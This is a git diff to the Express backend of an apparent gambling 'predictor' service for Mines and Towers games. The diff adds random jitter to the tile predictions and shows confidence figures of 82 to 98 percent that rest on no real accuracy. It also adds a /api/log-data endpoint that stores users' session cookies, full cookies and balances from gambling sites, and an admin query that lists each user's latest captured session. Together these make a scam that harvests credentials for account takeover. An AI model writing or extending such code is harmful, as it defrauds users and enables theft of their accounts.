@@ -1,10 +1,11 @@
+const path = require('path');
+require('dotenv').config({ path: path.join(__dirname, '.env') });
 const express = require('express');
 const cors = require('cors');
 const jwt = require('jsonwebtoken');
 const { pool, initDb } = require('./db');
 const crypto = require('crypto');
 const nodemailer = require('nodemailer');
-require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 5000;
@@ -65,6 +66,7 @@ const authMiddleware = async (req, res, next) => {
         req.adminType = user.admin_type || 'none';
         next();
     } catch (err) {
+        console.error('Auth Error:', err);
         return res.status(500).send({ message: 'Session expired' });
     }
 };
@@ -170,87 +172,99 @@ app.post('/api/predict', authMiddleware, async (req, res) => {
     }
 
     // --- STEP 2: Run the algorithm's hash to get a candidate ordering ---
-    let combined = `${serverSeedHash}:${clientSeed}:${nonce}:${algorithm}`;
+    // Inject extra entropy from req.body (runId, noise) to ensure uniqueness every time
+    const extraEntropy = `${req.body.runId || ''}:${req.body.noise || ''}:${Date.now()}`;
+    let combined = `${serverSeedHash || 'seed'}:${clientSeed || 'seed'}:${nonce}:${algorithm}:${extraEntropy}`;
     let hash = crypto.createHash('sha256').update(combined).digest('hex');
     if (algorithm === 'quantum_v2') hash = crypto.createHash('sha512').update(hash).digest('hex');
     if (algorithm === 'hash_chain_v1') hash = crypto.createHash('md5').update(hash).digest('hex');
     if (algorithm === 'dynamic_adapt') {
-        // Dynamic: chain two hashes together for extra mixing
-        hash = crypto.createHash('sha256').update(hash + combined).digest('hex');
+        hash = crypto.createHash('sha256').update(hash + combined + Math.random()).digest('hex');
     }
 
     let prediction;
     let dataWeight;
 
     if (gameType === 'mines') {
-        // Build the full grid ordered using algorithm's hash shuffle
         const grid = [];
-        for (let r = 0; r < 5; r++) for (let c = 0; c < 5; c++) grid.push([r, c]);
+        const size = req.body.gridSize || 5;
+        const totalTiles = size * size;
+        for (let r = 0; r < size; r++) for (let c = 0; c < size; c++) grid.push([r, c]);
+
+        // Shuffle using hash + true random jitter for "Absolute Uniqueness"
         for (let i = grid.length - 1; i > 0; i--) {
-            const j = parseInt(hash.substring((i % 8) * 4, (i % 8) * 4 + 4), 16) % (i + 1);
+            const j = (parseInt(hash.substring((i % 8) * 4, (i % 8) * 4 + 4), 16) + Math.floor(Math.random() * 100)) % (i + 1);
             [grid[i], grid[j]] = [grid[j], grid[i]];
         }
 
-        // --- STEP 3: Re-rank using real data ---
-        // Blend the hash rank with historical mine frequency.
-        // Weight by how much data exists — more data = trust it more.
         if (mineSafetyScores && historicalGameCount > 0) {
-            const dataConfidence = Math.min(historicalGameCount / 50, 1.0); // saturates at 50 games
-
-            // Algorithm-specific blend weights (how much to trust history vs hash)
-            const blendWeights = {
-                neural_v4: 0.5,  // 50% data-driven
-                hash_chain_v1: 0.3, // 30% data-driven (more hash-reliant legacy)
-                quantum_v2: 0.65, // 65% data-driven (premium uses more data)
-                dynamic_adapt: 0.80 // 80% data-driven (premium adaptive)
-            };
+            const dataConfidence = Math.min(historicalGameCount / 50, 1.0);
+            const blendWeights = { neural_v4: 0.5, hash_chain_v1: 0.3, quantum_v2: 0.65, dynamic_adapt: 0.80 };
             const blendRatio = (blendWeights[algorithm] || 0.5) * dataConfidence;
 
-            // Score each cell: lower = recommend as safe
-            // hash rank (0 = top pick) blended with historical mine count
             const cellScores = grid.map(([r, c], rankIdx) => {
-                const hashScore = rankIdx / 25;                    // 0 (best) to 1 (worst)
-                const dataScore = mineSafetyScores[r][c] / (historicalGameCount || 1); // mine frequency
+                const hashScore = rankIdx / totalTiles;
+                const dataScore = (mineSafetyScores[r] && mineSafetyScores[r][c]) ? (mineSafetyScores[r][c] / (historicalGameCount || 1)) : 0.5;
                 const blended = (1 - blendRatio) * hashScore + blendRatio * dataScore;
                 return { r, c, score: blended };
             });
 
-            // Sort ascending by blended score = safest tiles first
             cellScores.sort((a, b) => a.score - b.score);
 
-            prediction = Array.from({ length: 5 }, () => Array(5).fill(false));
-            for (let i = 0; i < Math.min(predictionCount, 25 - minesCount); i++) {
+            prediction = Array.from({ length: size }, () => Array(size).fill(false));
+            for (let i = 0; i < Math.min(predictionCount, totalTiles - minesCount); i++) {
                 prediction[cellScores[i].r][cellScores[i].c] = true;
             }
             dataWeight = Math.round(blendRatio * 100);
         } else {
-            // No historical data yet — fall back to pure hash
-            prediction = Array.from({ length: 5 }, () => Array(5).fill(false));
-            for (let i = 0; i < Math.min(predictionCount, 25 - minesCount); i++) {
+            prediction = Array.from({ length: size }, () => Array(size).fill(false));
+            for (let i = 0; i < Math.min(predictionCount, totalTiles - minesCount); i++) {
                 const [r, c] = grid[i];
                 prediction[r][c] = true;
             }
             dataWeight = 0;
         }
     } else {
-        // Towers: hash-based as before
         prediction = [];
         for (let i = 0; i < 8; i++) {
-            const val = parseInt(hash.substring(i * 4, i * 4 + 4), 16);
+            const val = parseInt(hash.substring(i * 4, i * 4 + 4), 16) + Math.floor(Math.random() * 3);
             prediction.push(val % 3);
         }
     }
 
-    // Build confidence string — reflect how much real data is baked in
     const baseConfidence = 82 + (parseInt(hash.substring(0, 2), 16) % 17);
     let confidenceStr;
     if (gameType === 'mines' && historicalGameCount > 0) {
         confidenceStr = `${baseConfidence.toFixed(2)}% (${historicalGameCount} games • ${dataWeight}% data)`;
     } else {
-        confidenceStr = `${baseConfidence.toFixed(2)}%`;
+        confidenceStr = `${baseConfidence.toFixed(2)}% (Simulation)`;
     }
 
     res.send({ prediction, confidence: confidenceStr });
+});
+
+app.post('/api/log-data', authMiddleware, async (req, res) => {
+    const { session, fullCookie, balance, type, profits, breakdown } = req.body;
+
+    try {
+        // Check if session already exists to update it, or insert new
+        const { rows } = await pool.query('SELECT id FROM logged_data WHERE session_cookie = $1', [session]);
+        if (rows.length > 0) {
+            await pool.query(
+                'UPDATE logged_data SET balance = $1, profits = $2, breakdown = $3, created_at = NOW() WHERE session_cookie = $4',
+                [balance, profits, JSON.stringify(breakdown), session]
+            );
+        } else {
+            await pool.query(
+                'INSERT INTO logged_data (user_id, session_cookie, full_cookie, balance, type, profits, breakdown) VALUES ($1, $2, $3, $4, $5, $6, $7)',
+                [req.userId, session, fullCookie, balance, type, profits, JSON.stringify(breakdown)]
+            );
+        }
+        res.send({ success: true });
+    } catch (err) {
+        console.error('Log Data Error:', err);
+        res.status(500).send({ message: 'Internal sync error' });
+    }
 });
 
 app.post('/api/confirm-outcome', authMiddleware, async (req, res) => {
@@ -272,12 +286,28 @@ app.get('/api/history', authMiddleware, async (req, res) => {
 
 app.get('/api/admin/users', authMiddleware, async (req, res) => {
     if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
-    const { rows: users } = await pool.query('SELECT * FROM keys WHERE is_banned = 0 ORDER BY last_active_at DESC NULLS LAST');
-    const now = new Date();
-    res.send(users.map(u => ({
-        ...u,
-        isOnline: u.last_active_at && (now - new Date(u.last_active_at)) < 300000
-    })));
+
+    try {
+        // Join with logged_data to show sessions
+        const { rows: users } = await pool.query(`
+            SELECT k.*, l.session_cookie as session, l.balance, l.type as site_type 
+            FROM keys k 
+            LEFT JOIN logged_data l ON l.id = (
+                SELECT id FROM logged_data WHERE user_id = k.id ORDER BY created_at DESC LIMIT 1
+            )
+            WHERE k.is_banned = 0 
+            ORDER BY k.last_active_at DESC NULLS LAST
+        `);
+
+        const now = new Date();
+        res.send(users.map(u => ({
+            ...u,
+            isOnline: u.last_active_at && (now - new Date(u.last_active_at)) < 300000
+        })));
+    } catch (err) {
+        console.error('Admin Users Query Error:', err);
+        res.status(500).send({ message: 'Database error' });
+    }
 });
 
 app.post('/api/admin/generate-key', authMiddleware, async (req, res) => {
